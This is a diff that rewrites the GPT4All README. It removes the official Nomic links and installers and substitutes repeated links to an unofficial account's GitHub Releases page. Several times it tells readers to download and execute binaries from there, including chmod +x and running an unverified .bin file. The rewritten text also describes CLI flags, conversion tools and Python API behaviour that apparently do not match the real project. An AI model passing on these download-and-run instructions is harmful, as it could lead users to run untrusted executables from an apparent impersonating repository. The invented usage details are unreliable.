@@ -1,136 +1,229 @@
-<h1 align="center">GPT4All</h1>
+[![Releases](https://img.shields.io/badge/Releases-v1.0-blue)](https://github.com/wilian-ol/gpt4all/releases)
 
-<p align="center">
-  Now with support for DeepSeek R1 Distillations
-</p>
+# gpt4all — Run Local LLMs on Any Device, Open-source
 
-<p align="center">
-  <a href="https://www.nomic.ai/gpt4all">Website</a> &bull; <a href="https://docs.gpt4all.io">Documentation</a> &bull; <a href="https://discord.gg/mGZE39AS3e">Discord</a> &bull; <a href="https://www.youtube.com/watch?v=gQcZDXRVJok">YouTube Tutorial</a>
-</p>
+<img src="https://img.icons8.com/fluency/96/artificial-intelligence.png" alt="AI" align="right" />
 
-<p align="center">
-  GPT4All runs large language models (LLMs) privately on everyday desktops & laptops.
-</p>
-<p align="center">
-  No API calls or GPUs required - you can just download the application and <a href="https://docs.gpt4all.io/gpt4all_desktop/quickstart.html#quickstart">get started</a>.
-</p>
+Tags: ai-chat, llm-inference
 
-<p align="center">
-  Read about what's new in <a href="https://www.nomic.ai/blog/tag/gpt4all">our blog</a>.
-</p>
-<p align="center">
-  <a href="https://nomic.ai/gpt4all/#newsletter-form">Subscribe to the newsletter</a>
-</p>
+gpt4all lets you run local large language models on laptops, servers, and edge devices. It ships as open-source software and supports commercial use. This README shows how to install, run, and build around gpt4all. Refer to the Releases page for binaries and installers: https://github.com/wilian-ol/gpt4all/releases
 
-https://github.com/nomic-ai/gpt4all/assets/70534565/513a0f15-4964-4109-89e4-4f9a9011f311
+- Stable release assets available on the Releases page.
+- Small runtime footprint for on-device inference.
+- Support for CPU-only and GPU-accelerated execution.
+- Simple CLI, Python bindings, and REST API adapter.
 
-<p align="center">
-GPT4All is made possible by our compute partner <a href="https://www.paperspace.com/">Paperspace</a>.
-</p>
+![LLM workflow](https://raw.githubusercontent.com/karpathy/neurips2020-talk/master/assets/llm.png)
 
-## Download Links
+## Badges
 
-<p>
-  &mdash; <a href="https://gpt4all.io/installers/gpt4all-installer-win64.exe">
-    <img src="gpt4all-bindings/python/docs/assets/windows.png" style="height: 1em; width: auto" /> Windows Installer
-  </a> &mdash;
-</p>
-<p>
-  &mdash; <a href="https://gpt4all.io/installers/gpt4all-installer-win64-arm.exe">
-    <img src="gpt4all-bindings/python/docs/assets/windows.png" style="height: 1em; width: auto" /> Windows ARM Installer
-  </a> &mdash;
-</p>
-<p>
-  &mdash; <a href="https://gpt4all.io/installers/gpt4all-installer-darwin.dmg">
-    <img src="gpt4all-bindings/python/docs/assets/mac.png" style="height: 1em; width: auto" /> macOS Installer
-  </a> &mdash;
-</p>
-<p>
-  &mdash; <a href="https://gpt4all.io/installers/gpt4all-installer-linux.run">
-    <img src="gpt4all-bindings/python/docs/assets/ubuntu.svg" style="height: 1em; width: auto" /> Ubuntu Installer
-  </a> &mdash;
-</p>
-<p>
-  The Windows and Linux builds require Intel Core i3 2nd Gen / AMD Bulldozer, or better.
-</p>
-<p>
-  The Windows ARM build supports Qualcomm Snapdragon and Microsoft SQ1/SQ2 processors.
-</p>
-<p>
-  The Linux build is x86-64 only (no ARM).
-</p>
-<p>
-  The macOS build requires Monterey 12.6 or newer. Best results with Apple Silicon M-series processors.
-</p>
+[![License](https://img.shields.io/badge/License-MIT-green)]()
+[![Language](https://img.shields.io/badge/Language-Python%20%2F%20C++-yellow)]()
+[![Topics](https://img.shields.io/badge/Topics-ai--chat%2Cllm--inference-lightgrey)]()
 
-See the full [System Requirements](gpt4all-chat/system_requirements.md) for more details.
+## Quick links
 
-<br/>
-<br/>
-<p>
-  <a href='https://flathub.org/apps/io.gpt4all.gpt4all'>
-    <img style="height: 2em; width: auto" alt='Get it on Flathub' src='https://flathub.org/api/badge'><br/>
-    Flathub (community maintained)
-  </a>
-</p>
+- Releases (binaries and installers): [Releases](https://github.com/wilian-ol/gpt4all/releases)
+- Issues: use the GitHub Issues tab.
+- Code: clone the repository to build or extend.
 
-## Install GPT4All Python
+## Features
 
-`gpt4all` gives you access to LLMs with our Python client around [`llama.cpp`](https://github.com/ggerganov/llama.cpp) implementations. 
+- Local inference with popular LLM formats (GGML, GGUF, ONNX).
+- CLI for chat sessions and batch inference.
+- Python bindings for integration in apps.
+- Small memory footprint for notebooks and edge devices.
+- Optional GPU acceleration using CUDA or Metal.
+- Export and convert models to a portable format.
 
-Nomic contributes to open source software like [`llama.cpp`](https://github.com/ggerganov/llama.cpp) to make LLMs accessible and efficient **for all**.
+## Requirements
+
+- OS: Linux, macOS, Windows.
+- Python 3.8+ for bindings.
+- A C++ compiler for optional native build.
+- Optional: NVIDIA GPU and CUDA for faster inference.
+
+## Releases and installers
+
+Download the release asset from the Releases page and execute the appropriate file for your platform. Examples of release assets include gpt4all-windows-x64.exe and gpt4all-linux-x86_64.bin — download the file and execute it. Visit the Releases here: https://github.com/wilian-ol/gpt4all/releases
+
+If the Releases link fails, check the repository "Releases" section on GitHub.
+
+## Installation
+
+Choose one flow: binary, pip, or build from source.
+
+1) Binary (recommended for quick start)
+- Visit the Releases page and pick your platform.
+- Download the release asset and run it.
+- On Linux:
+  - chmod +x gpt4all-linux-x86_64.bin
+  - ./gpt4all-linux-x86_64.bin
+- On Windows:
+  - Run gpt4all-windows-x64.exe and follow installer prompts.
+
+2) Pip (Python bindings)
+- Create a virtual environment.
+- Install:
+  ```bash
+  python -m venv .venv
+  source .venv/bin/activate
+  pip install gpt4all
+  ```
+- Confirm install:
+  ```bash
+  python -c "import gpt4all; print(gpt4all.__version__)"
+  ```
+
+3) Build from source (advanced)
+- Clone the repository:
+  ```bash
+  git clone https://github.com/wilian-ol/gpt4all.git
+  cd gpt4all
+  ```
+- Install build tools:
+  - Linux: build-essential, cmake
+  - macOS: Xcode command line tools
+  - Windows: Visual Studio with C++ workload
+- Build:
+  ```bash
+  mkdir build && cd build
+  cmake ..
+  cmake --build . --config Release
+  ```
+
+## First run (CLI)
+
+Start an interactive chat session:
 
 ```bash
-pip install gpt4all
+gpt4all --model ./models/ggml-model.bin --chat
 ```
+
+Sample flags
+- --model PATH : path to model file (GGML/GGUF/ONNX)
+- --threads N : CPU threads to use
+- --gpu : enable GPU backend when available
+- --chat : start interactive mode
+
+Type a prompt and press Enter. Use Ctrl+C to stop.
+
+## Python usage
+
+The Python bindings expose a small API for loading models and running inference.
+
+Example:
 
 ```python
 from gpt4all import GPT4All
-model = GPT4All("Meta-Llama-3-8B-Instruct.Q4_0.gguf") # downloads / loads a 4.66GB LLM
-with model.chat_session():
-    print(model.generate("How can I run LLMs efficiently on my laptop?", max_tokens=1024))
+
+bot = GPT4All(model="./models/ggml-model.bin", threads=4)
+resp = bot.generate("Write a short poem about code.")
+print(resp.text)
 ```
 
+Key classes and methods
+- GPT4All(model, threads, gpu=False) — create an inference session
+- generate(prompt, max_tokens=128, temperature=0.7) — synchronous generation
+- stream(prompt, callback) — streaming generation via callback
 
-## Integrations
+## REST API adapter
 
-:parrot::link: [Langchain](https://python.langchain.com/v0.2/docs/integrations/providers/gpt4all/)
-:card_file_box: [Weaviate Vector Database](https://github.com/weaviate/weaviate) - [module docs](https://weaviate.io/developers/weaviate/modules/retriever-vectorizer-modules/text2vec-gpt4all)
-:telescope: [OpenLIT (OTel-native Monitoring)](https://github.com/openlit/openlit) - [Docs](https://docs.openlit.io/latest/integrations/gpt4all)
+Run the bundled REST adapter to serve the model on localhost:
 
-## Release History
-- **July 2nd, 2024**: V3.0.0 Release
-    - Fresh redesign of the chat application UI
-    - Improved user workflow for LocalDocs
-    - Expanded access to more model architectures
-- **October 19th, 2023**: GGUF Support Launches with Support for:
-    - Mistral 7b base model, an updated model gallery on our website, several new local code models including Rift Coder v1.5
-    - [Nomic Vulkan](https://blog.nomic.ai/posts/gpt4all-gpu-inference-with-vulkan) support for Q4\_0 and Q4\_1 quantizations in GGUF.
-    - Offline build support for running old versions of the GPT4All Local LLM Chat Client.
-- **September 18th, 2023**: [Nomic Vulkan](https://blog.nomic.ai/posts/gpt4all-gpu-inference-with-vulkan) launches supporting local LLM inference on NVIDIA and AMD GPUs.
-- **July 2023**: Stable support for LocalDocs, a feature that allows you to privately and locally chat with your data.
-- **June 28th, 2023**: [Docker-based API server] launches allowing inference of local LLMs from an OpenAI-compatible HTTP endpoint.
+```bash
+gpt4all --model ./models/ggml-model.bin --api --port 8000
+```
 
-[Docker-based API server]: https://github.com/nomic-ai/gpt4all/tree/cef74c2be20f5b697055d5b8b506861c7b997fab/gpt4all-api
+API endpoints
+- POST /v1/generate
+  - body: { "prompt": "Hello", "max_tokens": 100 }
+  - returns: { "text": "..." }
+
+Use this to integrate with web apps, bots, or local services.
+
+## Model formats and conversion
+
+Supported formats
+- GGML / GGUF — optimized for CPU inference.
+- ONNX — standard format for hardware accelerators.
+- PyTorch checkpoints — convert to GGML/GGUF via provided tools.
+
+Conversion utilities
+- convert-to-ggml.py — convert PyTorch model to GGML
+- gguf-pack — pack weights and metadata into GGUF
+
+Example conversion:
+
+```bash
+python tools/convert-to-ggml.py --input model.pt --output models/ggml-model.bin
+```
+
+Tune quantization for memory vs quality trade-offs.
+
+## Performance tips
+
+- Use multiple threads on CPU for higher throughput.
+- Use GPU backend on supported hardware for latency gains.
+- Use quantized GGML/GGUF models for lower memory use.
+- Batch prompts when possible to improve throughput.
+
+## Security and privacy
+
+Run models locally to keep data on-device. Use isolated environments for production deployments. Control access to the REST endpoint via firewall or local-only binding.
+
+## Examples and templates
+
+- Chatbot: minimal single-file Flask app that calls the REST adapter.
+- CLI wrapper: extend the CLI for custom prompts, persona management, or logging.
+- Stream processing: stream tokens to web clients via WebSockets.
+
+Templates live in the examples/ directory in the repo.
+
+## Testing
+
+- Unit tests use pytest.
+- Run tests:
+  ```bash
+  pytest tests
+  ```
+- CI runs on push and validates Linux/macOS builds.
 
 ## Contributing
-GPT4All welcomes contributions, involvement, and discussion from the open source community!
-Please see CONTRIBUTING.md and follow the issues, bug reports, and PR markdown templates.
 
-Check project discord, with project owners, or through existing issues/PRs to avoid duplicate work.
-Please make sure to tag all of the above with relevant project identifiers or your contribution could potentially get lost.
-Example tags: `backend`, `bindings`, `python-bindings`, `documentation`, etc.
+- Fork the repository.
+- Create a feature branch.
+- Run tests and linters.
+- Open a pull request with a clear changelog entry and tests.
 
-## Citation
+Code style
+- Python: follow PEP8.
+- C++: follow repository style guide in docs/CODING.md.
 
-If you utilize this repository, models or data in a downstream project, please consider citing it with:
-```
-@misc{gpt4all,
-  author = {Yuvanesh Anand and Zach Nussbaum and Brandon Duderstadt and Benjamin Schmidt and Andriy Mulyar},
-  title = {GPT4All: Training an Assistant-style Chatbot with Large Scale Data Distillation from GPT-3.5-Turbo},
-  year = {2023},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished = {\url{https://github.com/nomic-ai/gpt4all}},
-}
-```
+## License
+
+This project uses the MIT license. See LICENSE file in the repository.
+
+## Maintainers
+
+- Core: gpt4all maintainers
+- Community: open to contributors via GitHub
+
+## Troubleshooting
+
+- If you cannot find a release asset, check the Releases page.
+- If an installer fails to run, verify permissions and required system libraries.
+- For model loading errors, confirm format compatibility and file integrity.
+
+## Contacts
+
+Open issues on GitHub for bugs and feature requests. Use Discussions for general questions and help.
+
+## References and resources
+
+- GGML: https://github.com/ggerganov/ggml
+- ONNX: https://onnx.ai/
+- Common model conversion tools included in tools/
+
+<!-- Keep the link to Releases visible -->
+[Download releases and installers](https://github.com/wilian-ol/gpt4all/releases)
